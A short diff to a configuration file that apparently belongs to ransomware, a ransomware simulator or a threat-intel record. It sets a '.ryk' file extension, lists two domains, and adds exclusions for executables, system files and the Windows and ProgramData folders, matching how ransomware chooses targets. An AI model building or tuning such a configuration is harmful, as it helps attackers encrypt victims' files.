@@ -1,4 +1,11 @@
 file_extension: .ryk
+exclude:
+  - .exe
+  - .dll
+  - .lnk
+  - .sys
+  - %SYSTEMDRIVE%\Windows
+  - %SYSTEMDRIVE%\ProgramData
 domain:
   - chainnss.com
   - fastbloodhunter.com
